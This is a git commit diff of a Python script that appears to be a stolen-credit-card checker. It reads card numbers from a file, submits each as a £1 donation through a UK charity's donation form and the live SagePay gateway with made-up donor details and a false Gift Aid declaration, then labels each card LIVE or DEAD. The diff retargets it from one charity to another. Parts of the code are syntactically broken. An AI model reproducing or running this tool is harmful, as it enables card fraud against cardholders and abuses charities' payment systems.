5f00bda3a60e77bf76209fba5917f113b9c914c3
Raml-Grimm <37857739+Raml-Grimm@users.noreply.github.com>
2019-06-28 22:55:42 -0700

    Update gateway2.py

--- gateway2.py
+++ gateway2.py
@@ -35,8 +35,7 @@ class Checker():
         else:
             print(Fore.RED + "[-] " + Fore.RESET + "Credit Card Type must be included")
             return
-
-        # self.proxy_https = {"https": "http://us.smartproxy.com:10000"}
+        
         self.proxy_https = {"https": ""}
         with open('cc.txt', 'r') as ccs:
             for x in ccs.read().split('\n'):
@@ -54,61 +53,61 @@ class Checker():
         headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36'}
 
 
-        mainSauce = BeautifulSoup(session.get('https://www.rowanshospice.co.uk/donate/make-a-donation/', headers=headers).text, 'html.parser')
+        mainSource = BeautifulSoup(session.get('https://www.refuge.org.uk/donate/single-donation/', headers=headers).text, 'html.parser')
 
-        state_6 = mainSauce.find('input', {'name': 'state_6'})['value']
+        state_6 = mainSource.find('input', {'name': 'state_6'})['value']
 
-        persdeyta = {
-            'input_13': '£ 1.00',
-            'input_2': 'Mr',
-            'input_3': 'Jason',
-            'input_4': 'Amber',
-            'input_25': 'bloodhubv1@gmail.com',
-            'input_30': 'Mr',
-            'input_8': 'Street 955 commonwealth ave.',
-            'input_31': '',
-            'input_9': 'Quezon City',
-            'input_10': 'Manila',
-            'input_6': '1214',
-            'input_28.4': '',
-            'input_28.6': 'Philippines',
-            'input_12': '09661994748',
-            'input_29': '',
-            'input_32.2': 'email',
-            'input_27.3': 'No thank you',
-            'input_33.3': 'No thank you',
-            'input_35.2': 'No thank you',
-            'is_submit_6': '1',
-            'gform_submit': '6',
-            'gform_unique_id': '',
-            'state_6': "WyJbXSIsIjk4Njk2OWVhNDcxMGE5Njc1OTliZTUwZDdhNTQzM2VhIl0=",
-            'gform_target_page_number_6': '0',
-            'gform_source_page_number_6': '1',
-            'gform_field_values': '',
+        FirstData = {
+            'input_13: Other Amount|0,
+            'input_14: '£ 1.00',
+            'input_4: 'Donation',
+            'input_5: 'George',
+            'input_6: 'Smith',
+            'input_7: 'Quezon, Riverside',
+            'input_15: '',
+            'input_8: 'Makati city',
+            'input_16: '',
+            'input_17: '1216',
+            'input_11: 'Philippines',
+            'input_18: 'bloodhubv1@gmail.com',
+            'input_19: '2536452165',
+            'input_20: '09661554748',
+            'input_21: 'I help',
+            'input_27: 'Email',
+            'input_23: 'Yes, I would like to Gift Aid any donations I make to Refuge (Registered Charity No. 277424) from today and during the four years prior to this date.<br><br>I am a UK tax payer and understand if I pay less Income Tax and/or Capital Gains Tax than the amount of Gift Aid claimed on all my donations in that year, it is my responsibility to pay any difference. Gift Aid is reclaimed by Refuge from the tax you pay for the current year. Please notify Refuge if you would like to cancel this declaration, change your home address or no longer pay sufficient income tax and/or capital gains tax.',
+            'input_29.1: 'Yes, I am happy to receive emails from Refuge.',
+            'input_32: '',
+            'is_submit_1: '1',
+            'gform_submit: '1',
+            'gform_unique_id: '',
+            'state_1: 'WyJ7XCIxM1wiOltcIjdjYWM2ZmU4NTBjY2M1NTE0OWJhOGVhNGRiN2Y5ZjQ1XCIsXCIyZWRkMzQ5ZjQ4ZGI5ZDZjOGM1ZmUyNTk2OWI3YjhjZFwiLFwiZWYwMmE2YWUzNGEyMmMwNzEwMGRhNDYzOWRkMTExYjRcIixcIjgyNzQyNGNhNzRkZDdmNDIwMGU2OTYwYjM4MjI5ZjlmXCIsXCJjYmMyMDdlOGI1ZjQ2Y2YxNGQ3ZGFhOWMxZGI2NTNjN1wiLFwiOTg5Mjg1MDFkY2ZmNWNmNDk0OGU0YjE5MDViMjQxMWNcIl19IiwiYjI0NmE4YzgyYWFhZWQwZGRjMTY0ZTQyZTU0MjVlMDgiXQ==',
+            'gform_target_page_number_1: '0',
+            'gform_source_page_number_1: '1',
+            'gform_field_values: '',
         }
 
 
-        persrespans = BeautifulSoup(session.post('https://www.rowanshospice.co.uk/donate/make-a-donation/', data=persdeyta, headers=headers).text, 'html.parser')
+        #persrespans = BeautifulSoup(session.post('https://www.rowanshospice.co.uk/donate/make-a-donation/', data=persdeyta, headers=headers).text, 'html.parser')
         
-        lastdeyta = {
-            'VPSProtocol': '3.00',
-            'TxType': 'PAYMENT',
-            'Vendor': 'rowanshospice',
-            'Crypt': persrespans.find('input', {'name': 'Crypt'})['value']
-        }
+        #lastdeyta = {
+        #    'VPSProtocol': '3.00',
+        #    'TxType': 'PAYMENT',
+        #    'Vendor': 'rowanshospice',
+        #    'Crypt': persrespans.find('input', {'name': 'Crypt'})['value']
+        #}
 
-        he = {
-            "cache-control": "no-store, no-cache, must-revalidate, post-check=0, pre-check=0",
-            "content-language": "en-US",
-            "content-type": "application/x-www-form-urlencoded"
-        }
+        #he = {
+        #    "cache-control": "no-store, no-cache, must-revalidate, post-check=0, pre-check=0",
+        #    "content-language": "en-US",
+        #    "content-type": "application/x-www-form-urlencoded"
+        #}
         last = session.post('https://live.sagepay.com/gateway/service/vspform-register.vsp', data=lastdeyta, headers=headers)
         ################# SAGE PAY ###################
 
         fourthSource = session.post("https://live.sagepay.com/gateway/service/cardselection", data={'action': 'proceed', 'cardselected': self.cc}, headers=headers)
 
         sixthData = {
-            'cardholder': "Jason Amber",
+            'cardholder': "George Smith",
             'cardnumber': ccNum,
             'expirymonth': ccMonth,
             'expiryyear': ccYear,
@@ -118,14 +117,14 @@ class Checker():
         sixthSource = session.post("https://live.sagepay.com/gateway/service/carddetails", data=sixthData, headers=headers)
         seventhSource = session.get("https://live.sagepay.com/gateway/service/cardconfirmation", headers=headers).text
         eightSource = session.post("https://live.sagepay.com/gateway/service/cardconfirmation", data={'action': 'proceed'}, headers=headers)
-        lastShit = BeautifulSoup(session.get("https://live.sagepay.com/gateway/service/authentication", headers=headers).text, 'html.parser')
+        Final = BeautifulSoup(session.get("https://live.sagepay.com/gateway/service/authentication", headers=headers).text, 'html.parser')
 
 
         try:
-            if "insufficient" in lastShit.find('div', {'class': "notification"}).get_text().replace('\n', '').replace('\t', ''):
+            if "insufficient" in Final.find('div', {'class': "notification"}).get_text().replace('\n', '').replace('\t', ''):
                 print(Fore.GREEN + '[' + ccentry + '] ' + "LIVE   ---   " + credit_card)
 
-            print(Fore.RED + '[' + ccentry + '] ' + "DEAD   ---   " + credit_card + '\tREASON: ' + lastShit.find('div', {'class': "notification"}).get_text().replace('\n', '').replace('\t', ''))
+            print(Fore.RED + '[' + ccentry + '] ' + "DEAD   ---   " + credit_card + '\tREASON: ' + Final.find('div', {'class': "notification"}).get_text().replace('\n', '').replace('\t', ''))
         except Exception as e:
 
             print(Fore.GREEN + '[' + ccentry + '] ' + "LIVE   ---   " + credit_card + '\tNote: Not Sure')
